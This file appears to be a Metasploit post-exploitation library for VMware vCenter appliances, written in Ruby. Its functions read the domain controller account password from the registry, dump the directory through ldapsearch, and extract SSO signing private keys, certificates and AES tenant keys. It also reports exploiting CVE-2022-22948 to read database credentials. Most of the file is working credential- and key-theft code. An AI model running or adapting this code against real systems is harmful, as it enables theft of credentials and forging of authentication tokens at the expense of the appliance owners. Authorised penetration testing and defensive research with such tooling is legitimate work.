# -*- coding: binary -*-

module Msf
  class Post
    module Vcenter
      module Vcenter
        include Msf::Post::File
        include Msf::Post::Linux::Priv

        def manifest_file
          '/opt/vmware/etc/appliance-manifest.xml'
        end

        def deployment_type_file
          '/etc/vmware/deployment.node.type'
        end

        def database_type_file
          '/etc/vmware/db.type'
        end

        def photon_version_file
          '/etc/photon-release'
        end

        def vmafd_bin
          '/usr/lib/vmware-vmafd/bin/vmafd-cli'
        end

        def lwregshell_bin
          '/opt/likewise/bin/lwregshell'
        end

        def vpxd_bin
          '/usr/sbin/vpxd'
        end

        def ldapsearch_bin
          '/opt/likewise/bin/ldapsearch'
        end

        def vecs_bin
          '/usr/lib/vmware-vmafd/bin/vecs-cli'
        end

        def psql_bin
          '/opt/vmware/vpostgres/current/bin/psql'
        end

        def vcd_properties_file
          '/etc/vmware-vpx/vcdb.properties'
        end

        #
        # Function to determine if a string is a valid FQDN or not
        # @param fqdn [String] the string to check if it is a valid FQDN or not
        # @return [Bool] boolean if the string is a valid FQDN
        #
        def is_fqdn?(fqdn)
          return true if fqdn.to_s.downcase =~ /(?=^.{4,253}$)(^((?!-)[a-z0-9-]{0,62}[a-z0-9]\.)+[a-z]{2,63}$)/

          false
        end

        #
        # Function to determine if a string is a valid UUID or not
        # @param uuid [String] the string to check if it is a valid UUID or not
        # @return [Bool] boolean if the string is a UUID
        #
        def is_uuid?(uuid)
          return true if uuid.to_s.downcase =~ /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/

          false
        end

        #
        # Function to determine if a dn is legitimate
        # @param dn [String] the string to determine if its a dn or not
        # @return [Bool] boolean if the string is a valid DN address
        #
        def is_dn?(dn)
          return true if dn.to_s.downcase =~ /^(?:(?<cn>cn=(?<name>[^,]*)),)?(?:(?<path>(?:(?:cn|ou)=[^,]+,?)+),)?(?<domain>(?:dc=[^,]+,?)+)$/

          false
        end

        #
        # Function to validate an x509 certificate. Validates with or without certificate header line
        # @param cert [String] the string to determine if its a valid x509 certificate
        # @return [OpenSSL::X509::Certificate] or nil on error
        #
        def validate_x509_cert(cert)
          # the gsub is specific to vcenter ldapsearch returning spaces after a new line, but shouldn't
          # effect normal certs read from files
          [cert, "-----BEGIN CERTIFICATE-----\n#{cert.strip}\n-----END CERTIFICATE-----".gsub("\n ", "\n")].each do |cert|
            return OpenSSL::X509::Certificate.new(cert)
          rescue OpenSSL::X509::CertificateError
            nil
          end
          nil
        end

        #
        # Function to validate an x509 private key
        # @param cert [String] the string to determine if its a valid x509 private key
        # @return [OpenSSL::PKey::RSA] or nil on error
        #
        def validate_pkey(private_key)
          # the gsub is specific to vcenter ldapsearch returning spaces after a new line, but shouldn't
          # effect normal keys read from files
          [private_key, "-----BEGIN PRIVATE KEY-----\n#{private_key.strip}\n-----END PRIVATE KEY-----".gsub("\n ", "\n")].each do |private_key|
            return OpenSSL::PKey::RSA.new(private_key)
          rescue OpenSSL::PKey::PKeyError
            nil
          end
          nil
        end

        #
        # It returns the vcenter product banner and build number
        # @return [String] of vcenter product banner and build number
        #
        def get_vcenter_build
          if command_exists?(vpxd_bin)
            return cmd_exec("#{vpxd_bin} -v").split("\n").last.strip
          end

          if file_exist?(manifest_file)
            xml = read_file(manifest_file)
            xmldoc = Nokogiri::XML(xml) do |config|
              config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
            end
            return "#{xmldoc.at_xpath('/update/product').text} #{xmldoc.at_xpath('/update/fullVersion').text}"
          end
          nil
        end

        #
        # It returns the vcenter deployment type. Should be 'embedded', 'infrastructure', or 'management'
        # @return [String] of vcenter deployment type
        #
        def get_deployment_type
          return nil unless file_exist?(deployment_type_file)

          return read_file(deployment_type_file).downcase.strip
        end

        #
        # It returns the vcenter database type. Should be 'embedded', or 'management'
        # https://kb.vmware.com/s/article/83193
        # @return [String] of vcenter database type
        #
        def get_database_type
          return nil unless file_exist?(database_type_file)

          return read_file(database_type_file).downcase.strip
        end

        #
        # It returns the host FQDN.
        # @return [String] of the host FQDN
        #
        def get_fqdn
          fqdn = nil
          if command_exists?('/opt/vmware/share/vami/vami_hname') && command_exists?('/opt/vmware/share/vami/vami_domain')
            fqdn = "#{cmd_exec('/opt/vmware/share/vami/vami_hname').strip}.#{cmd_exec('/opt/vmware/share/vami/vami_domain').strip}".downcase
          elsif file_exist?('/etc/hostname')
            fqdn = read_file('/etc/hostname').downcase.strip
          end
          return fqdn if is_fqdn?(fqdn)
        end

        #
        # It returns the IPv4 address of an interface.
        # @return [String] of the host IPv4 interface
        #
        def get_ipv4(interface = 'eth0')
          # we make an assumption ifconfig exists, this may fail in the future
          vsphere_machine_ipv4 = cmd_exec("ifconfig | grep #{interface} -A1 | grep \"inet addr:\"").strip
          return nil if vsphere_machine_ipv4.nil?

          vsphere_machine_ipv4 = vsphere_machine_ipv4.split('  ')[0] # splits to inet addr, bcast, mask
          return nil if vsphere_machine_ipv4.nil?

          vsphere_machine_ipv4 = vsphere_machine_ipv4.split(':')[1]
          return nil unless Rex::Socket.is_ipv4?(vsphere_machine_ipv4)

          vsphere_machine_ipv4
        end

        #
        # Grabs the photon release and build number
        # @return [String, String] of the photon release and build number
        #
        def get_os_version
          return nil unless file_exist?(photon_version_file)

          os = read_file(photon_version_file)
          os = os.split("\n")
          return os[0].strip.to_s, os[1].split('=')[1].strip.to_s
        end

        #
        # Returns the machine-id (UUID) of a server by name
        # @param server_name [String] server name to check. Defaults to `localhost`
        # @return [String] UUID of the machine's UUID
        #
        def get_machine_id(server_name = 'localhost')
          return nil unless command_exists?(vmafd_bin)

          return cmd_exec("#{vmafd_bin} get-machine-id --server-name #{server_name}").strip
        end

        #
        # Returns the domain name of the server
        # @return [String] of the domain name
        #
        def get_domain_name
          return nil unless command_exists?(lwregshell_bin)

          return cmd_exec("#{lwregshell_bin} list_values '[HKEY_THIS_MACHINE\\Services\\vmafd\\Parameters]'|grep DomainName|awk '{print $4}'|tr -d '\"'").strip
        end

        #
        # Returns the domain controller account DN
        # @return [String] of the domain controller account DN
        #
        def get_domain_dc_dn
          return nil unless command_exists?(lwregshell_bin)

          return cmd_exec("#{lwregshell_bin} list_values '[HKEY_THIS_MACHINE\\Services\\vmdir]'|grep dcAccountDN|awk '{$1=$2=$3=\"\";print $0}'|tr -d '\"'|sed -e 's/^[ \t]*//'").strip
        end

        #
        # Returns the domain controller account password
        # @return [String] of the domain controller account password, matches with get_domain_dc_dn. nil if not found.
        #
        def get_domain_dc_password
          return nil unless command_exists?(lwregshell_bin)

          password = cmd_exec("echo $(#{lwregshell_bin} list_values '[HKEY_THIS_MACHINE\\Services\\vmdir]'|grep dcAccountPassword |awk -F 'REG_SZ' '{print $2}')").strip
          return nil unless password

          return password[1..password.length - 2].gsub('\"', '"')
        end

        #
        # Returns the LDF file contents from the remote system
        # @param base_fqdn [String] fully qualified domain name of the virtual center
        # @param vc_psc_fqdn [String] fully qualified domain name of the virtual center
        # @param base_dn [String] the base dn to search in ldap
        # @param bind_dn [String] the base dn to use
        # @param shell_bind_pw [String] the password for the bind dn
        # @return [String] of the LDF contents. nil if not found.
        #
        # TODO: Make this less jank. LDIF data is too big to put in a string, the
        #       only way to get a complete copy is to write it to the filesystem
        #       on the appliance first and copy it to our local machine for
        #       processing. This is slow and inefficient and there is probably a
        #       much better way. I would also love to lose the ARTIFACTS_ON_DISK
        #       side effect.
        def get_ldif_contents(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
          temp_ldif_file = "/tmp/.#{base_fqdn}_#{Time.now.strftime('%Y%m%d%H%M%S')}.tmp"
          rm_f(temp_ldif_file) if file_exist?(temp_ldif_file)
          out = cmd_exec("#{ldapsearch_bin} -h #{vc_psc_fqdn} -b '#{base_dn}' -s sub -D '#{bind_dn}' -w #{shell_bind_pw} \\* \\+ \\- \> #{temp_ldif_file}")
          return nil unless file_exist?(temp_ldif_file)

          contents = read_file(temp_ldif_file)
          if contents.nil?
            print_warning('Unable to retrieve ldif contents')
            if rm_f(temp_ldif_file)
              vprint_good("Removed temporary file from vCenter appliance: #{temp_ldif_file}")
            else
              print_warning("Unable to remove temporary file from vCenter appliance: #{temp_ldif_file}")
            end
            return nil
          end

          contents.gsub(/^$\n/, '')
        end

        #
        # Returns the list of stores from the vecs cli
        # @return [Array] of String stores, nil on error
        #
        def get_vecs_stores
          return nil unless command_exists? vecs_bin

          out = cmd_exec("#{vecs_bin} store list")
          return nil if out.nil?

          out.split("\n")
        end

        #
        # Returns a list of hashes for the vecs store
        # @param vecs_store [String] the store to get entries from
        # @return [Array] of hashes, nil on error
        #
        def get_vecs_entries(vecs_store)
          return nil unless command_exists? vecs_bin

          out = cmd_exec("#{vecs_bin} entry list --store #{vecs_store}")
          return nil if out.nil?

          # time to process this beast. its roughly " : " delimited, but things like certificates are multi-line
          delimiter = " :\t"
          output = []
          current_entry = {}
          last_key = ''
          out = out.split("\n")
          out.each do |line|
            # handle anything that looks to be a continuation of the last key
            unless line.include? delimiter
              current_entry[last_key] = "#{current_entry[last_key]}\n#{line}"
              next
            end

            line = line.split(delimiter).map(&:strip)
            key = line.shift
            value = line.join(delimiter)
            last_key = key
            next if key.include? 'Number of entries in store' # heading for output

            # Alias is assumed first line of an entry, so append any non-blank previous entries to our output
            if key == 'Alias' && !current_entry.empty?
              output.append(current_entry)
              current_entry = { key => value }
              next
            end
            current_entry[key] = value
          end
          output.append(current_entry) unless current_entry.empty?
          return output

          nil
        end

        #
        # Returns a private key for an alias in a vecs store
        # @param vecs_store [String] the store to get entries from
        # @return [OpenSSL::PKey::RSA] of content, nil on error
        #
        def get_vecs_private_key(vecs_store, entry_alias)
          return nil unless command_exists? vecs_bin

          key_b64 = cmd_exec("#{vecs_bin} entry getkey --store #{vecs_store} --alias #{entry_alias}")
          begin
            return OpenSSL::PKey::RSA.new(key_b64)
          rescue OpenSSL::PKey::PKeyError
            nil
          end
          nil
        end

        #
        # Returns a hash table of the vcdb.properties file
        # @param location [String] where the file is located. defaults to /etc/vmware-vpx/vcdb.properties
        # @return [Hash] hash of the file contents, nil on error
        #
        def process_vcdb_properties_file(location = vcd_properties_file)
          return nil unless file_exist?(location)

          contents = read_file(location)
          return nil if contents.nil?

          if location == vcd_properties_file && is_root? == false
            print_good('Exploited CVE-2022-22948 to read #{vcd_properties_file}')
          end
          output = {}
          contents.each_line(chomp: true) do |line|
            next unless line.include?('=') # attempt to do a little quality control

            line = line.split('=')
            key = line.shift.strip
            value = line.join('=').strip
            output[key] = value
            next unless key == 'url'

            # url is a compound object with database type, host, port, and name.
            # we'll split that into its own as well to make them easy to reference
            # example line -> 'jdbc:postgresql://localhost:5432/VCDB'
            value = value.split('://')
            output['db_engine'] = value[0].split(':')[1]
            output['host'] = value[1].split(':')[0]
            output['port'] = value[1].split(':')[1].split('/')[0]
          end
          # pull out the name from the url
          unless output['url'].nil?
            output['name'] = output['url'].split('/').last
          end
          output
        end

        #
        # Returns a string of the platform service controller used
        # @param vc_type_management [Boolean] if the host is a vcenter manager or not
        # @param host [String] the host to determine the service controller for. localhost by default
        # @return [String] the fqdn of the service controller, nil on error
        #
        def get_platform_service_controller(vc_type_management = false, host = 'localhost')
          return nil unless command_exists? vmafd_bin

          unless vc_type_management
            return 'localhost'
          end

          lookup_service = cmd_exec("#{vmafd_bin} get-ls-location --server-name #{host}")
          ls_host = URI.parse(lookup_service).host.downcase
          print_warning("External Platform Service Controller Detected: #{ls_host}")
          ls_host
        end

        #
        # Retrieves the IDP private key
        # @param base_fqdn [String] fully qualified domain name of the virtual center
        # @param vc_psc_fqdn [String] fully qualified domain name of the virtual center
        # @param base_dn [String] the base dn to search in ldap
        # @param bind_dn [String] the base dn to use
        # @param shell_bind_pw [String] the password for the bind dn
        # @return [Array] of the private key (PKey), nil on error
        #
        def get_idp_keys(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
          return nil unless command_exists? ldapsearch_bin

          header = 'vmwSTSPrivateKey:: '
          legacy_key_file = '/etc/vmware-sso/keys/ssoserverSign.key'
          all_keys = []
          key_contents = ''
          output = cmd_exec("#{ldapsearch_bin} -h #{vc_psc_fqdn} -LLL -p 389 -b \"cn=#{base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{base_dn}\" -D \"#{bind_dn}\" -w #{shell_bind_pw} \"(objectclass=vmwSTSTenantCredential)\" vmwSTSPrivateKey")
          output = output.split("\n")
          key_output = false
          output.each do |line|
            # skip anything until we get to content
            next unless line.starts_with?(header) || key_output

            # aka our first key
            if line.starts_with?(header) && !key_output # first key
              key_output = true
            elsif line.starts_with?(header) && key_output # our n+1 key
              pkey = validate_pkey(key_contents.strip)
              all_keys.append(pkey) unless pkey.nil?
              key_contents = ''
            end
            line = line.gsub(header, '')
            key_contents += "#{line.strip}\n" if key_output
          end
          pkey = validate_pkey(key_contents.strip)
          all_keys.append(pkey) unless pkey.nil?
          return all_keys unless all_keys.empty?

          # now we try the legacy approach since that failed
          print_warning('vmwSTSPrivateKey was not found in vmdir, checking for legacy ssoserverSign key PEM files...')
          return nil unless file_exist?(legacy_key_file)

          key_contents = read_file(legacy_key_file)
          key = validate_pkey(key_contents)
          return [key] unless key.nil?

          nil
        end

        #
        # Retrieves the IDP certificate
        # @param base_fqdn [String] fully qualified domain name of the virtual center
        # @param vc_psc_fqdn [String] fully qualified domain name of the virtual center
        # @param base_dn [String] the base dn to search in ldap
        # @param bind_dn [String] the base dn to use
        # @param shell_bind_pw [String] the password for the bind dn
        # @return [Array] of the Certificates, nil on error
        #
        def get_idp_certs(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
          return nil unless command_exists? ldapsearch_bin

          header = 'userCertificate:: '
          legacy_cert_file = '/etc/vmware-sso/keys/ssoserverSign.crt'
          all_certs = []
          cert_contents = ''
          output = cmd_exec("#{ldapsearch_bin} -h #{vc_psc_fqdn} -LLL -p 389 -b \"cn=#{base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{base_dn}\" -D \"#{bind_dn}\" -w #{shell_bind_pw} \"(objectclass=vmwSTSTenantCredential)\" userCertificate")
          output = output.split("\n")
          cert_output = false
          output.each do |line|
            # skip anything until we get to content
            next unless line.starts_with?(header) || cert_output

            # aka our first key
            if line.starts_with?(header) && !cert_output # first cert
              cert_output = true
            elsif line.starts_with?(header) && cert_output # our n+1 cert
              cert = validate_x509_cert(cert_contents.strip)
              all_certs.append(cert) unless cert.nil?
              cert_contents = ''
            end
            line = line.gsub(header, '')
            cert_contents += "#{line.strip}\n" if cert_output
          end
          cert = validate_x509_cert(cert_contents.strip)
          all_certs.append(cert) unless cert.nil?
          return all_certs unless all_certs.empty?

          # now we try the legacy approach since that failed
          print_warning('userCertificate was not found in vmdir, checking for legacy ssoserverSign cert PEM files...')
          return nil unless file_exist?(legacy_cert_file)

          cert_contents = read_file(legacy_cert_file)
          cert = validate_x509_cert(cert_contents)
          return [cert] unless cert.nil?

          nil
        end

        #
        # Retrieves the AES keys (STS Tenant, vpx).
        # https://github.com/vmware/lightwave/blob/master/vmidentity/install/src/main/java/com/vmware/identity/installer/SystemDomainAdminUpdateUtils.java#L72-L78
        # @param base_fqdn [String] fully qualified domain name of the virtual center
        # @param vc_psc_fqdn [String] fully qualified domain name of the virtual center
        # @param base_dn [String] the base dn to search in ldap
        # @param bind_dn [String] the base dn to use
        # @param shell_bind_pw [String] the password for the bind dn
        # @return [Array] of the keys, nil on error
        #
        def get_aes_keys(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
          return nil unless command_exists? ldapsearch_bin

          # this may error,
          header = 'vmwSTSTenantKey: '
          header2 = 'vmwSTSTenantKey:: '
          legacy_key_file = '/etc/vmware-vpx/ssl/symkey.dat'
          all_keys = []
          key_contents = ''
          output = cmd_exec("#{ldapsearch_bin} -h #{vc_psc_fqdn} -LLL -p 389 -b \"cn=#{base_fqdn},cn=Tenants,cn=IdentityManager,cn=Services,#{base_dn}\" -D \"#{bind_dn}\" -w #{shell_bind_pw} \"(objectClass=vmwSTSTenant)\" vmwSTSTenantKey")
          output = output.split("\n")
          key_output = false
          output.each do |line|
            # skip anything until we get to content
            next unless line.starts_with?(header) || line.starts_with?(header2) || key_output

            # aka our first key, there should only be one, but just in case
            if (line.starts_with?(header) || line.starts_with?(header2)) && !key_output # first key
              key_output = true
            elsif (line.starts_with?(header) || line.starts_with?(header2)) && key_output # our n+1 key
              key = key_contents.strip
              all_keys.append(key) unless key.empty?
              key_contents = ''
            end
            line = line.gsub(header2, '')
            line = line.gsub(header, '')
            key_contents += "#{line.strip}\n" if key_output
          end
          key = key_contents.strip
          all_keys.append(key) unless key.empty?

          # go try for the vmware-vpx AES key
          exists = file_exist?(legacy_key_file)
          return all_keys if !exists && !all_keys.empty?
          return nil if !exists && all_keys.empty?

          cert_contents = read_file(legacy_key_file)
          unless cert_contents.nil? || cert_contents.empty?
            all_keys.append(cert_contents.strip)
            return all_keys unless all_keys.empty?
          end

          nil
        end
      end
    end
  end
end
